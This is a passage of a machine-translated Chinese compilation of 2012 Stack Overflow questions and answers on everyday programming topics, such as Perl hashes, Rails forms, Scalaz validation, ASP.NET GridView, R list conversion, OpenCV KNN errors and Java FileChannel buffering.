  @data{qw/ss_lat ss_long/} = @{$ss}{qw/Latitude Longitude/};
  $data{difference} = sprintf("%.3f", $distance->miles);
  \%data;
} @$source; 
```

哪个有效。它通过添加来自初始数据集的几个切片（它们单独不包含整行，这正是我关心的）以及两者之间的计算结果来构建散列。有没有办法可以将结尾行干净地组合成一个匿名 hashref 构造函数？或者像这样构建结果数据集是首选的方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:04:08.383

你需要类似的东西[`pairwise`](http://search.cpan.org/perldoc?List%3a%3aMoreUtils)。

```
use List::MoreUtils qw( pairwise );

my @output_data =
   map +{
      ( pairwise { $a => $_->{$b} }
         @{[qw( username addr1 addr2 city state zip rec_lat rec_long )]},
         @{[qw( username addr1 addr2 city state zip lat     long     )]},
      ),
      ( pairwise { $a => $ss->{$b} }
         @{[qw( ss_lat   ss_long   )]},
         @{[qw( Latitude Longitude )]},
      ),
   },
      @$source; 
```

# ruby-on-rails-3 - Rails 一个表单来编辑相同模型的许多记录

> ID：12587092
> 
> 赞同：1
> 
> 时间：2012-09-25T16:21:38.773
> 
> 标签：ruby-on-rails-3, forms, simple-form

假设我有一个用户模型、一个品种模型​​和一个宠物模型。用户将拥有许多不同品种的宠物。我想要一个看起来像这样的表格：

[下拉菜单选择宠物名称]

[名称] <--- 根据需要编辑名称

[品种]

[年龄]

[颜色]

因此，如果用户有 10 只不同的宠物，则“下拉菜单以选择宠物名称”中将有 10 个宠物名称。当用户从下拉列表中选择一个名称时，应预先填写其他字段。希望有一种方法可以删除记录或添加新记录。

我的直觉是遍历表单，将它们包装在 div 中，然后使用 JS 来控制哪个是可见的。不过，这似乎是不必要的复杂。这真的是最好的方法吗？

用户的记录可能不会超过 50 条。

* * *

编辑添加：

好的，所以我想我得到了更多。这是我应该做的。在我的控制器中，我应该有类似的东西：

```
current_user.pets.each do
   @pets = pets.find(#ID) 
end 
```

那么在我看来我应该有：

```
[Drop down of all pets]

 pets.each do
   <div id=id class=hidden>
   simple_form_for @pet_ID
   </div>
 end 
```

然后是在下拉菜单中触发的脚本：

```
<script>
 Hide <div> with previous pet id
  Show <div> with new pet id
</script> 
```

结合 railscasts 中的嵌套表单应该可以做到，对吧？我在这里犯了什么菜鸟错误吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:30:04.423

查看 Ryan Bates 的 Railscasts。查找嵌套集合。

[http://railscasts.com/episodes/196-nested-model-form-part-1](http://railscasts.com/episodes/196-nested-model-form-part-1)

[http://railscasts.com/episodes/197-nested-model-form-part-2](http://railscasts.com/episodes/197-nested-model-form-part-2)

他为在一对多的其他集合中嵌套集合提供了一个非常简单的解决方案。瑞恩真棒。如果你对 Rails 开发很认真，他的全系列视频每月价值 9 美元。

# scala - 在函数中将 List[String] 转换为 ValidationNEL[String, A]

> ID：12587093
> 
> 赞同：8
> 
> 时间：2012-09-25T16:21:49.433
> 
> 标签：scala, types, scalaz

我有一个具有以下签名的函数

```
def reject[A](errors: List[String]): ValidationNEL[String, A] 
```

由于这是一个拒绝方法，因此`A`永远不会返回该类型，但我需要将其反映以匹配签名。我正在使用 lambdas 类型来获得我想要的结果，如下所示：

```
errors.map(Failure[String, A](_).liftFailNel).sequence[({type l[a] = ValidationNEL[String, a]})#l, A] 
```

这使用类型`List[A]`（或看起来），而不是我想要的类型`A`。有没有一种标准的方法来得出我正在寻找的结果？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-25T16:53:41.713

因为`errors`可能是一个空的`List`，并且你限制自己没有 type 的值`A`，我认为你不能把它写成一个总函数。要编写此类型签名，您需要通过假装空列表案例不存在来作弊，例如

```
def reject[A](errors: List[String]): ValidationNEL[String, A] =
  Failure(errors.toNel.get) // bad! 
```

* * *

**编辑：**正如 Apocalisp 指出的那样，您当然可以通过为空列表引入错误来使其成为一个整体功能。但我只会`errors`在运行时计算，我怀疑这不是你的用例，因为它会导致愚蠢的错误，例如：

```
def reject[A](errors: List[String]): ValidationNEL[String, A] =
  Failure(errors.toNel getOrElse NonEmptyList("Error: There were no errors!")) 
```

* * *

为什么不通过`errors`as a`NonEmptyList`来代替 - 如果您在编译时有错误要使用，大概您只使用此函数。

```
def reject[A](errors: NonEmptyList[String]): ValidationNEL[String, A] =
  Failure(errors) 
```

`NonEmptyList.apply`您可以通过复制（并将其专门用于）的签名来使用此简洁器`String`：

```
def reject[A](h: String, t: String*): ValidationNEL[String, A] =
  Failure(NonEmptyList(h, t: _*)) 
```

让我们试一试：

```
scala> reject("foo", "bar", "baz")
res0: scalaz.package.ValidationNEL[String,Nothing] = Failure(NonEmptyList(foo, bar, baz)) 
```

# ios - 获取 UIButton 的 x 和 y 坐标

> ID：12587094
> 
> 赞同：-3
> 
> 时间：2012-09-25T16:21:50.557
> 
> 标签：ios, button, uibutton, tags, coordinates

我有一个名为“buttonPressed”的按钮。当我按下按钮时，我需要找到该按钮的 x 和 y 坐标。你有什么想法可以帮助我吗？

```
 UIButton *circleButton = [UIButton buttonWithType:UIButtonTypeRoundedRect];
    circleButton.frame = rect;
    circleButton.layer.cornerRadius = 8.0f;
    [circleButton addTarget:self
                     action:@selector(buttonPressed:)
           forControlEvents:UIControlEventTouchUpInside];
    [self addSubview:circleButton];

-(void)buttonPressed:(id)sender
{

} 
```

**回答**

```
 - (IBAction)buttonPressed:(UIButton *)sender
     {
       CGPoint coordinates = sender.frame.origin;
       CGFloat x = coordinates.x;
       CGFloat y = coordinates.y;
     } 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-25T16:35:30.997

听起来您希望 X 和 Y 离开动作的发送者。将发件人参数附加到您的按钮点击方法并找到发件人的框架。

```
- (IBAction)buttonTapped:(UIButton *)sender
{
    CGPoint coordinates = sender.frame.origin;
} 
```

# c# - 强制 Gridview 显示 x 行，包括空行

> ID：12587096
> 
> 赞同：0
> 
> 时间：2012-09-25T16:22:00.823
> 
> 标签：c#, asp.net, gridview

即使数据少于 x 行，是否可以强制 gridview 显示 x 行？当然，差异是用空行弥补的。

我发现这个页面：[http](http://aspdotnetcodebook.blogspot.ca/2008/03/how-to-force-force-x-number-of-rows-in.html) ://aspdotnetcodebook.blogspot.ca/2008/03/how-to-force-force-x-number-of-rows-in.html试图用谷歌搜索这个问题但没有太多解释如何使用提出的解决方案。

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:26:00.817

在将您的 DataSource 绑定到您的 GirdView 之前，我会检查返回的行数并将空行添加到您的数据源。

因此，假设您始终希望 10 行可见：

```
var myDataSource = GetDataSource();
if(myDataSource.Count() < MIN_NUMBER_OF_ROWS)
{
    myDataSource.AddRange(GetEmptyRows(MIN_NUMBER_OF_ROWS - myDataSource.Count()));
}
myGridView.DataSource = myDataSource; 
```

然后`GetEmptyRows(int numberOfRowsNeeded)`返回您需要的空行数。

编辑：假设您的来源是`MyCustomGridRow`带有属性的类型`isValid`。然后，您可以拦截数据绑定的每一行，并根据`isValid`属性修改您的`GridViewRow`（自定义消息、colspan、...）的外观。

```
protected virtual void myGridView_OnRowDataBound(GridViewRowEventArgs e)
{
     if (e.Item.ItemType == ListItemType.Item || e.Item.ItemType == ListItemType.AlternatingItem)
     {
         MyCustomGridRow customRow = (MyCustomGridRow)(e.Item.DataItem);

         if (!customRow.isValid)
         {
             int colCount = myGridView.Columns.Count;
             e.Item.Cells.Clear();
             Label lblEmptyMessage = new Label
             {
                 Text = "Custom message for eempty rows.",
                 CssClass = "ErrLabels"
             };
             TableCell newCell = new TableCell
             {
                 ColumnSpan = colCount
             };
             newCell.Controls.Add((Control)lblEmptyMessage);
             e.Item.Cells.Add(newCell);
         }
     }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-02T19:00:44.390

以下代码完成了我想做的事情：

```
DataTable dt1 = new DataTable();
DataRow dr1;
dt1.Columns.Add("ProjectID");
dt1.Columns.Add("ProjectName");
dt1.Columns.Add("Country");
for (int i = 0; i < 10; i++)
{
     dr1 = dt1.NewRow();
     dr1["ProjectID"] = dr1["ProjectName"] = dr1["Country"] = "";
     dt1.Rows.Add(dr1);
}
dt1.AcceptChanges();
ProjectListGridView.DataSource = dt1;
ProjectListGridView.DataBind(); 
```

# jquery - :first.click 获取多个 uls

> ID：12587098
> 
> 赞同：1
> 
> 时间：2012-09-25T16:22:08.493
> 
> 标签：jquery

好吧，我正在研究一个轻量级的简单下拉列表。我遇到了这个小问题：

```
<script>
$(document).ready(function () {
$('ul li:first a').click(function () {
    if ($(this).attr('class') != 'active') {
        $('.hideContent').slideUp(300);
        $('.showContent').removeClass('active');
        $(this).addClass('active').next('ul').slideDown(300);
        event.stopPropagation();
    }
    else {
        $(this).removeClass('active');          
        $('.hideContent').slideUp();
    }       
});
});
</script> 
```

:first 仅触发第一个 ul。我现在使用多个 uls：

```
 <ul>
    <li><a href="#"><span class="plus">+</span><span class="minus">-</span>Administração</a>
        <ul class="hideContent">
            <li><a href="#">Item</a></li>
            <li><a href="#">Item</a></li>
            <li><a href="#">Item</a></li>
            <li><a href="#">Item</a></li>
            <li><a href="#">Item</a></li>
        </ul>
    </li>
</ul>
    <ul>
    <li><a href="#"><span class="plus">+</span><span class="minus">-</span>Administração</a>
        <ul class="hideContent">
            <li><a href="#">Item</a></li>
            <li><a href="#">Item</a></li>
            <li><a href="#">Item</a></li>
            <li><a href="#">Item</a></li>
            <li><a href="#">Item</a></li>
        </ul>
    </li>
</ul> 
```

:first 不应该触发每个 ul 的第一个 li？还是我的工作方式错误？

提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-25T16:24:50.523

首先只匹配一个元素，尝试使用`:first-child`。

> 虽然这仅匹配单个元素，但 :first-child 可以匹配多个：每个父元素一个。

[http://api.jquery.com/first-selector/](http://api.jquery.com/first-selector/)

# python - 基于角度旋转乐高 nxt

> ID：12587099
> 
> 赞同：1
> 
> 时间：2012-09-25T16:22:18.297
> 
> 标签：python, lego, nxt

我想知道有没有一种方法可以使用基于两点 r(x1,y1) 和 p(x2,y2) 的角度来旋转乐高 nxt，而当机器人从面向北变为南、东或西方。谢谢

问候， 爱德华

# c# - 你如何设置 ApiController.User

> ID：12587108
> 
> 赞同：3
> 
> 时间：2012-09-25T16:22:46.143
> 
> 标签：c#, asp.net-mvc, unit-testing, asp.net-mvc-4, asp.net-web-api

在我的 apicontroller 中，我使用 base.user 来识别要在查找中使用的经过身份验证的用户。现在我正在为此编写一个单元测试，但我无法弄清楚如何模拟 apicontroller.user。我需要创建一个请求并将用户设置在那里吗？还是有另一种设置controller.user的方法？

这是我的控制器；我已经模拟了存储库和会员服务。

```
[Authorize]
public class DocumentController : ApiController
{
    DocumentRepository _repository;
    IStaticMembershipService _membership;

    public IEnumerable<Document> GetDocuments()
    {
        MembershipUser userAccount = _membership.GetUser(base.User);
        IEnumerable<Document> docs = null;

        if (userAccount != null)
        {
            docs = _repository.GetDocumentsByUserId(
                (Guid) userAccount.ProviderUserKey);
        }

        return docs;
    } 
```

这是我的单元测试：

```
[TestClass]
public class DocumentControllerWebService
{
    private DocumentsContext _context;
    private DocumentRepository _repository;
    private DocumentController _controller;
    private FakeMembershipService _membership;
    private TestContext testContextInstance;

    [TestInitialize]
    public void MyTestInitialize()
    {
        // Create a context with a fake data set provider
        _context = new DocumentsContext(new FakeDbSetProvider());
        _repository = new DocumentRepository(_context);
        _membership = new FakeMembershipService();
        _controller = new DocumentController(_repository, _membership);
    }

    public void GetDocumentsTest()
    {
        string userName = "someUser";
        MembershipUser userAccount = _membership.GetUser(userName);
        Guid userId = (Guid) userAccount.ProviderUserKey;
        Guid anotherUserId = Guid.NewGuid();

        // Get some dummy data and insert it into the fake repository
        List<Document> forms = DocumentDummyData.GetListOfDummyData(
            userId, anotherUserId);
        forms.ForEach(f => _repository.InsertDocument(f));

        // I would like to do this but User is readonly
        _controller.User = userName;

        List<Document> docs = _controller.GetDocuments().ToList();
        foreach (Document expected in forms.Where(d => d.UserId == userId))
        {
            Document actual = docs.Where(
                d => d.DocumentID == expected.DocumentID).FirstOrDefault();
            Assert.IsNotNull(actual);
            Assert.AreEqual(expected.DocumentID, actual.DocumentID);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T16:51:15.300

如果您从 http 请求中获取用户，那么您将需要研究一种模拟它的方法。值得庆幸的是，这已经做过很多次了。一个好的起点是阅读这个

[http://www.codethinked.com/post/2008/12/04/Using-SystemWebAbstractions-in-Your-WebForms-Apps.aspx](http://www.codethinked.com/post/2008/12/04/Using-SystemWebAbstractions-in-Your-WebForms-Apps.aspx)

总结一下我在此之后所做的事情，一个 hanselman 博客和一些试验和错误：

在您的 ApiController 中将其添加到您的构造函数中

```
HttpContextWrapper = HttpContextFactory.GetHttpContext(); 
```

工厂是这里

```
public static class HttpContextFactory
{
    [ThreadStatic]
    private static HttpContextBase _mockHttpContext;
    public static void SetHttpContext(HttpContextBase httpContextBase)
    {
        _mockHttpContext = httpContextBase;
    }

    public static HttpContextBase GetHttpContext()
    {
        if (_mockHttpContext != null)
        {
            return _mockHttpContext;
        }

        if (HttpContext.Current != null)
        {
            return new HttpContextWrapper(HttpContext.Current);
        }
        return null;
    }
} 
```

现在你有一个接缝，你可以在其中插入你的模拟请求、响应、会话等。

```
HttpContextBase httpContext = HttpMocks.HttpContext();
HttpContextFactory.SetHttpContext(httpContext); 
```

最后，这是我使用的一个完全模拟的上下文

```
public class HttpMocks
{
    public static HttpContextBase HttpContext()
    {
        var context = MockRepository.GenerateMock<HttpContextBase>();
        context.Stub(r => r.Request).Return(HttpRequest());
        context.Stub(r => r.Response).Return(HttpResponse());
        context.Stub(r => r.Session).Return(HttpSession());
        context.Stub(r => r.Server).Return(HttpServer());
        return context;
    }

    private static HttpServerUtilityBase HttpServer()
    {
        var httpServer = MockRepository.GenerateMock<HttpServerUtilityBase>();
        httpServer.Stub(r => r.MapPath("")).IgnoreArguments().Return("");
        return httpServer;
    }

    private static HttpResponseBase HttpResponse()
    {
        var httpResponse = MockRepository.GenerateMock<HttpResponseBase>();
        var cookies = new HttpCookieCollection {new HttpCookie("UserContext")};
        httpResponse.Stub(r => r.Cookies).Return(cookies);

        Func<string, string> returnWhatWasPassed = x => x;
        httpResponse.Stub(r => r.ApplyAppPathModifier(""))
            .IgnoreArguments().Do(returnWhatWasPassed);

        return httpResponse;
    }

    public static HttpRequestBase HttpRequest()
    {
        var httpRequest = MockRepository.GenerateMock<HttpRequestBase>();
        var cookies = new HttpCookieCollection
        {
            new HttpCookie("UserContext")
        };
        httpRequest.Stub(r => r.Cookies).Return(cookies);

        var parameters = new NameValueCollection
        {
            { "id", "277" },
            { "binderId", "277" }
        };
        httpRequest.Stub(r => r.Params).Return(parameters);
        httpRequest.Stub(r => r.ApplicationPath).Return("/");
        httpRequest.Stub(r => r.AppRelativeCurrentExecutionFilePath)
            .Return("~/");
        httpRequest.Stub(r => r.PathInfo).Return("");

        var serverVariables = new NameValueCollection();
        httpRequest.Stub(r => r.ServerVariables).Return(serverVariables);

        return httpRequest;
    }

    public static HttpSessionStateBase HttpSession()
    {
        var s =  new FakeSessionState();
        s["mocking"] = "true";
        return s;
    }
} 
```

这是一个相当长的答案，但如果您需要有关任何内容的更多详细信息，请告诉我们，您现在可以忽略虚假会话。

# r - R将数据从列表移动到数据框

> ID：12587111
> 
> 赞同：3
> 
> 时间：2012-09-25T16:22:51.533
> 
> 标签：r

我有一个`list`包含 0-3 个 id 号码，如下所示：

```
[[1]]
[1] 2125233 <NA>    <NA>

[[2]]
[1] 2009281 2380145 2931851

[[3]]
[1] 1517163 2836702 2506119 
```

如何将其转换为`data frame`元素编号变为 id 并且元素的内容变为字符串/因子的位置，如下所示：

```
 id                   contents
   1             2125233 <NA>    <NA>
   2             2009281 2380145 2931851
   3             1517163 2836702 2506119
  ...                 ..... 
```

我试过看，`unlist`但它只是把所有东西都扔进一个长向量中。

有什么建议么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-25T16:24:42.673

```
List <- list(c(123, NA, NA), c(1223, 4546,5656), c(4546,4646,464))
> List
[[1]]
[1] 123  NA  NA

[[2]]
[1] 1223 4546 5656

[[3]]
[1] 4546 4646  464

> data.frame(do.call(rbind, List))

    X1   X2   X3
1  123   NA   NA
2 1223 4546 5656
3 4546 4646  464 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-25T17:23:02.103

[Jilber 提到的](https://stackoverflow.com/a/12587145/1270695)方法`do.call(rbind...)`可能是最常见或最直观的（并且比以下方法更快），但如果您想使用.`unlist`

诀窍是与`matrix()`结合使用`unlist`，将行数设置为`length`列表的。

```
List <- list(c(123, NA, NA), c(1223, 4546,5656), c(4546,4646,464))
matrix(unlist(List), nrow = length(List), byrow = TRUE)
#      [,1] [,2] [,3]
# [1,]  123   NA   NA
# [2,] 1223 4546 5656
# [3,] 4546 4646  464

## Or, for a data.frame
data.frame(matrix(unlist(List), nrow = length(List), byrow = TRUE)) 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-25T16:24:28.697

```
library(plyr)
ldply(list_name)

> x <- c(1,2,3)
> foo <- list(x,x,x)
> foo
[[1]]
[1] 1 2 3

[[2]]
[1] 1 2 3

[[3]]
[1] 1 2 3

> ldply(foo)
  V1 V2 V3
1  1  2  3
2  1  2  3
3  1  2  3 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-26T18:15:28.950

R`data.frames`实际上是列表，如果列表中的每个向量都是一列，这将成为一项简单的任务：

```
List <- list(c(123, NA, NA), c(1223, 4546,5656), c(4546,4646,464))
DF <- data.frame(List) 
```

在列表的每个元素都是向量的情况下，您可以使用Jilber 所示的 and ，或转置上述`do.call`内容：`rbind``data.frame`

```
DF <- data.frame(t(DF)) 
```

# eclipse - Anjuta 运行时崩溃（命令行 `dbus-launch -- autolaunch = --binary-syntax --close-stderr'）

> ID：12587112
> 
> 赞同：0
> 
> 时间：2012-09-25T16:22:53.297
> 
> 标签：eclipse, unix, ubuntu, anjuta

我最近安装了 anjuta 和 eclipse（ubuntu 12.04）并且在执行时都崩溃了。

Anjuta 抛出这个警告：

```
 ** (anjuta:10578): WARNING **: Command line `dbus-launch            
 --autolaunch=ffab43442e6b810b3d0603ea00000009 --binary-syntax --close-stderr' exited       
 with non-zero exit status 1: Autolaunch error: X11 initialization failed.\n 
```

Eclipse 抛出：

```
 (eclipse:10587): GLib-GObject-WARNING **: invalid (NULL) pointer instance
 (eclipse:10587): GLib-GObject-CRITICAL **: g_signal_connect_data: assertion   
 `G_TYPE_CHECK_INSTANCE (instance)' failed
 ** (eclipse:10587): WARNING **: Command line `dbus-launch   
 --autolaunch=ffab43442e6b810b3d0603ea00000009 --binary-syntax --close-stderr' exited 
 with non-zero exit status 1: Autolaunch error: X11 initialization failed.\n
 (eclipse:10587): Gtk-CRITICAL **: IA__gtk_settings_get_for_screen: assertion    
 `GDK_IS_SCREEN (screen)' failed
 (eclipse:10587): Gtk-WARNING **: Screen for GtkWindow not set; you must always set
 a screen for a GtkWindow before using the window
 ...
 Segmentation fault (core dumped) 
```

如何设置 GtkWindow 的屏幕？

# opencv - KNN 找到最近的错误

> ID：12587120
> 
> 赞同：-1
> 
> 时间：2012-09-25T16:23:35.387
> 
> 标签：opencv, machine-learning

我正在对静态手势进行 KNN 分类，但出现此错误。

> 错误：NUIGHR.exe 中 0x01213aa2 处的未处理异常：0xC0000005：访问冲突读取位置 0x00000000。

```
CvMat* GetFeatures(CvSeq* contour, CvSeq* hull, double boundingRectArea){
CvMoments moments;
CvHuMoments humoments;
cvMoments(contour, &moments, cvGetHuMoments(&moments, &humoments);

int cCont;
double cArea, cPerimeter, cDiameter, cExtent, cCompactness, cEccentricity, cCircularity;

cCont         = contour->total;
cArea         = fabs(cvContourArea(contour));
cPerimeter    = cvContourPerimeter(contour);
cDiameter     = sqrt( 4 * cArea / CV_PI);
cExtent       = cArea / (boundingRectArea * boundingRectArea);
cCompactness  = (4 * cArea * CV_PI) / cPerimeter;
cEccentricity = pow( (moments.m20 - moments.m02), 2) - (4 * pow(moments.m11, 2)) / ( pow(moments.m20 + moments.m02, 2) );
cCircularity = pow(cPerimeter, 2) / cArea;

cvmSet( featureVector, 0, 0,  boundingRectArea);
cvmSet( featureVector, 0, 1,  cCont);
cvmSet( featureVector, 0, 2,  cArea);
cvmSet( featureVector, 0, 3,  cPerimeter);
cvmSet( featureVector, 0, 4,  cDiameter);
cvmSet( featureVector, 0, 5,  cExtent);
cvmSet( featureVector, 0, 6,  cCompactness);
cvmSet( featureVector, 0, 7,  cEccentricity);
cvmSet( featureVector, 0, 8,  cCircularity);
cvmSet( featureVector, 0, 9,  humoments.hu1);
cvmSet( featureVector, 0, 10, humoments.hu2);
cvmSet( featureVector, 0, 11, humoments.hu3);
cvmSet( featureVector, 0, 12, humoments.hu4);
cvmSet( featureVector, 0, 13, humoments.hu5);
cvmSet( featureVector, 0, 14, humoments.hu6);
cvmSet( featureVector, 0, 15, humoments.hu7);

return featureVector;
}
int main(){
...
const int K = 10;
CvKNearest *knn = NULL;
float resultNode = 0;
CvMat* featVector = cvCreateMat(1, NUMBER_OF_FEATURES, CV_32FC1 );
CvMat* nearest = cvCreateMat(1, K, CV_32FC1);
...
resultNode = knn->find_nearest(&featVector, K, 0, 0, nearest, 0);
} 
```

我想我需要将 CvMat* 转换为 CvMat。我该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T23:42:23.017

featureVector = NULL 指针对不起，伙计们...我是初学者:(

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T21:46:35.420

您不能将 0 作为第 3 和第 4 个参数传递给 find_nearest 函数，如果您确实将某些东西作为第 5 个参数传递，则不能。OpenCV 尝试填充结果和 neighbourResponses（[请参阅 doc](http://docs.opencv.org/modules/ml/doc/k_nearest_neighbors.html?highlight=find_nearest#cv2.KNearest.find_nearest)），但无法读取/写入 NULL 指针。

# c# - 正则表达式拆分字符串

> ID：12587121
> 
> 赞同：1
> 
> 时间：2012-09-25T16:23:37.077
> 
> 标签：c#, regex

我正在尝试解析以下字符串：

> *一种。BOSCOLO1,4, JA STARR2, N. LUNARDI4, C. ORI4, JP BENNETT, Jr3, V. JEVTOVIC-TODOROVIC2,3,4,

预期的输出如下：

> *一种。BOSCOLO1,4
> JA STARR2
> N. LUNARDI4
> C. ORI4
> JP Bennett, Jr3
> V. JEVTOVIC-TODOROVIC2,3,4

我不能在分隔符 (,) 上拆分它们，因为它不一致。以上是后跟一位或多位数字的名称。单词后跟数字和逗号，直到下一个单词，并且不允许没有任何数字的名称。
我不知道如何为相同的 REGEX 编写。任何帮助将不胜感激。
谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T16:34:56.090

您可以使用这样的正则表达式：;

```
[*A-Z]\D+\d+(,\d+)* 
```

例子：

```
string data = "*A. BOSCOLO1,4, J. A. STARR2, N. LUNARDI4, C. ORI4, J. P. BENNETT, Jr3, V. JEVTOVIC-TODOROVIC2,3,4,";

MatchCollection matches = Regex.Matches(data, @"[*A-Z]\D+\d+(,\d+)*");

foreach (Match x in matches) {
  Console.WriteLine(x);
} 
```

输出：

```
*A. BOSCOLO1,4
J. A. STARR2
N. LUNARDI4
C. ORI4
J. P. BENNETT, Jr3
V. JEVTOVIC-TODOROVIC2,3,4 
```

# java - 如何在 Java 中实现缓冲/批处理 FileChannel？

> ID：12587125
> 
> 赞同：2
> 
> 时间：2012-09-25T16:23:51.720
> 
> 标签：java, io, real-time, nio

这看起来并不简单，特别是对于读/写缓冲的 FileChannel。是否有任何开源实现了我可以基于我的实现的地方？

* * *

不懂的人说清楚：

FileChannel 在操作系统级别进行缓冲，我想在 Java 级别进行缓冲。阅读此处了解：[FileChannel#force 和缓冲](https://stackoverflow.com/questions/4742543/filechannelforce-and-buffering)

* * *

@Peter我想从快速消息流中将一个大文件写入磁盘。缓冲和批处理是要走的路。所以我想在Java中批处理，然后调用FileChannel.write。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-25T18:19:14.130

我建议使用`BufferedOutputStream`包装 a `FileOutputStream`。我不相信你会通过使用and看到*任何*性能改进，如果你走这条路，你会留下很多难以维护的代码。`ByteBuffer``FileChannel`

推理非常简单：无论您采用哪种方法，所涉及的步骤都是相同的：

1.  生成字节。你没有说你打算如何做到这一点，它可能会在等式中引入额外的临时缓冲级别。但无论如何，Java 数据必须转换为字节。
2.  将字节累积到缓冲区中。您希望在写入数据之前对其进行缓冲，这样您就不会进行大量的小写入。这是给定的。但是缓冲区的位置并不重要。
3.  跨 JNI 屏障将字节从 Java 堆移动到 C 堆。写入文件是本机操作，它不会直接从 Java 堆中读取。因此，无论您是在 Java 堆上缓冲然后移动缓冲的字节，还是直接缓冲`ByteBuffer`（是的，您想要一个*直接*缓冲区），您仍在移动字节。您将使用 进行更多的 JNI 调用`ByteBuffer`，但这是边际成本。
4.  Invoke `fwrite`，一个内核调用，将字节从 C 堆复制到内核维护的磁盘缓冲区中。
5.  将内核缓冲区写入磁盘。这将超过所有其他步骤的总和，因为*磁盘很慢*。

根据您实施这些步骤的具体方式，可能会增加或减少几微秒，但您无法更改基本步骤。

`FileChannel`确实为您提供了调用选项，`force()`以确保步骤 #5 实际发生。这实际上可能会*降低*您的整体性能，因为在写入字节之前底层`fsync`调用不会返回。如果你真的想这样做，你总是可以从底层流中获取通道。

底线：我敢打赌，您实际上是受 IO 限制的，并且无法治愈节省更好的硬件。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-25T16:31:27.210

FileChannel 仅适用于 ByteBuffers，因此它是自然缓冲的。如果您需要额外的缓冲才能将数据从 ByteBuffer 复制到 ByteBuffer 但我不确定您为什么要这样做。

> FileChannel 在操作系统级别进行缓冲

FileChannel 确实告诉操作系统该做什么。操作系统通常有一个磁盘缓存，但 FileChannel 不知道是否是这种情况。

> 我想在 Java 级别做缓冲

你很幸运，因为你别无选择。;) 这是唯一的选择。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-09-25T16:56:48.977

我将有两个线程，生产者线程产生 ByteBuffers 并将它们附加到队列的尾部，消费者线程每次从队列的头部删除一些 ByteBuffers，并调用 fileChannel.write(ByteBuffer[])。

# iphone - UIScrollView 只滚动文本

> ID：12587132
> 
> 赞同：3
> 
> 时间：2012-09-25T16:24:04.367
> 
> 标签：iphone, objective-c, ios, xcode

我最近将我的 xcode 更新到 4.5，但现在我的 UIScrollView 不再工作了，在我以前的 xcode 中，我以完全相同的方式制作了滚动视图，并在其中放置了一个图像视图背景和一些按钮，当我滚动时它们会滚动。

现在有了这个新的 xcode，当我在其中放置一些东西时，它根本不会滚动。只有当我将 textview 放入其中并使文本长于屏幕时它才会滚动，但即使这样当我在其上放置一个按钮时，按钮也不会滚动，只会滚动文本。这真的很烦人，我不知道我做错了什么。我整天都在努力寻找解决方案。

我的 ScrollView 放在我的视图中，大小为 320,480。

在我的 ViewDidLoad 我有：

```
[scroller setScrollEnabled:YES];
[scroller setContentSize:CGSizeMake(320, 481)]; 
```

我还有一张图片让我的设置更清晰，当我在这张图片中运行项目时，它会因为文本长度而滚动。图像背景是 320x960，但图片不滚动它应该去底部颜色变得更暗.. 我希望你明白我的意思。

![在此处输入图像描述](../Images/1c131277fb0c8711957a41b7fa363103.png)

**额外的**

我制作了一个视频来展示我所做的事情，显示当我放入东西时它不会滚动

[http://www.youtube.com/watch?v=rzYTWLiIC8g&feature=youtu.be](http://www.youtube.com/watch?v=rzYTWLiIC8g&feature=youtu.be)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T16:58:48.780

将您`scrollView` `contentSize`的 s**高度**设置为大于其原始**高度**，那么它肯定可以垂直滚动。

尝试这个 -

```
[scroller setContentSize:CGSizeMake(320, 800)]; 
```

然后看它是否滚动。

# diff - 带有额外突出显示的差异工具

> ID：12587134
> 
> 赞同：2
> 
> 时间：2012-09-25T16:24:08.173
> 
> 标签：diff

GitHub 的差异查看器有一个很好的功能，它在更改的行上有额外的突出显示。例如，在这个差异中，只插入了一个单词：

![在此处输入图像描述](../Images/c05f073614461b902e3e0e34e3282acc.png)

是否有其他工具可以显示这样的差异？Pastebin 的 diff 查看器和[http://www.quickdiff.com/](http://www.quickdiff.com/)不这样做，如果您告诉它突出显示 .diff 文件，即使 GitHub 的 gist 也不会这样做。

我想要一些方法来获取两个文件或 diff 的输出并显示这个漂亮的输出，而不必将它放在 GitHub 上。有什么存在吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T22:58:21.500

[Kompare](http://www.kde.org/)能够突出显示查看的补丁中的差异，尽管它在两个不同的窗格中显示文件内容，而不是像您的图片中那样逐行显示。

![kompare 截图](../Images/d651f85d07bd3aa825e797cc6f248dc4.png)

* * *

对于突出显示的差异，我更喜欢[KDiff3](http://kdiff3.sourceforge.net/)，但它需要两个文件来比较，它不像 kompare 那样直接对补丁文件进行操作。

![KDiff3 截图](../Images/8dec4f0067595863f28153eb400e1fc8.png)

# c++ - 是否有理由不使用单元强制类型？

> ID：12587136
> 
> 赞同：6
> 
> 时间：2012-09-25T16:24:10.667
> 
> 标签：c++, boost, types, units-of-measurement, boost-units

从概念上讲，在我看来，使用基于单位强制的类型*（米、秒、千克）*会带来巨大的好处*（额外检查传递的参数，摆脱 vars 中的单位名称等）*，但我还没有遇到那么多代码确实如此。我看到的代码确实使用了自定义类型。

我看到 boost 有一个单位库*（boost::units 很简单）*，但是，我没有看到太多证据表明它被广泛使用*（在基本的谷歌搜索中）*。

这有充分的理由吗？

